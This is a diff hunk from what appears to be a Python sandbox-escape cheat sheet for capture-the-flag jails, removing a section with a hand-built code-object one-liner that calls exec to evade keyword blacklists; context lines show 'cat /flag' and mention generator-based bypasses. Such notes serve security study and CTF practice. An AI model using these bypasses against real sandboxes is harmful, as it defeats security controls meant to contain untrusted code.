@@ -199,14 +199,6 @@ system("cat /flag")
 ### builtins are deleted from everywhere:
 https://gist.github.com/CharlesAverill/e7fef5a6e078f14b7ac7b3d318e3e24f?permalink_comment_id=4749794#gistcomment-4749794
 
-### Bypass blacklists building functions from scratch
-```py
-# The number of arguments may change based on the Python version
-(lambda x:0).__class__((lambda x:0).__code__.__class__(0, 0, 0, 3, 64, 10, b't\x00d\x01\x83\x01S\x00', (None, 'Your Code Goes Here'), ('exe''c',), ('',), '', '', 1, b'', (), ()), (lambda x:0).__globals__)()
-```
-
-You can also use generators or async functions.
-
 ### Bypass blacklists using generators
 
 ```py
